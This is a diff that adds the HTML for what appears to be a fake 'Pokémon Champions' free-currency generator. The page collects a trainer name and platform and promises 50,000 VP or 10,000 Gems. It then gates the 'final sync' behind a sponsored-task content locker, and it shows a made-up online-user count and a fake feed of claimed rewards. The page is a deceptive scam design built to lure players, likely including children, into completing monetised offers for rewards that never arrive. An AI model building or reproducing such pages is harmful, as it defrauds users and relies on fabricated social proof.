@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pokémon Champions - Global Resource Sync</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="background-overlay"></div>
+    
+    <div class="container">
+        <header>
+            <img src="pokemon-logo-2026.png" alt="Logo" class="logo">
+            <div class="live-status">
+                <span class="dot"></span> 1,482 Users Online
+            </div>
+        </header>
+
+        <section id="step1" class="glass-card">
+            <h2>Connect Your Account</h2>
+            <div class="input-group">
+                <input type="text" id="username" placeholder="Enter Trainer Name...">
+                <select id="platform">
+                    <option value="ios">iOS / iPhone</option>
+                    <option value="android">Android</option>
+                    <option value="switch">Nintendo Switch</option>
+                </select>
+            </div>
+            <button class="neon-btn" onclick="nextStep(2)">Connect Now</button>
+        </section>
+
+        <section id="step2" class="glass-card hidden">
+            <h2>Select Your Rewards</h2>
+            <div class="resource-grid">
+                <div class="res-item" onclick="selectRes(this)">
+                    <img src="vp-icon.png">
+                    <span>50,000 VP</span>
+                </div>
+                <div class="res-item" onclick="selectRes(this)">
+                    <img src="gems-icon.png">
+                    <span>10,000 Gems</span>
+                </div>
+            </div>
+            <button class="neon-btn" onclick="nextStep(3)">Sync Resources</button>
+        </section>
+
+        <section id="step3" class="glass-card hidden">
+            <h2>Final Sync Required</h2>
+            <p>To prevent bot abuse, please complete one of the sponsored tasks below to verify your account.</p>
+            <div id="locker-placeholder">
+                <div class="offer-item">Complete Verification</div>
+            </div>
+        </section>
+        
+        <div class="recent-activity">
+            <p id="activity-text">Trainer `Red_Master` just claimed 10k Gems!</p>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
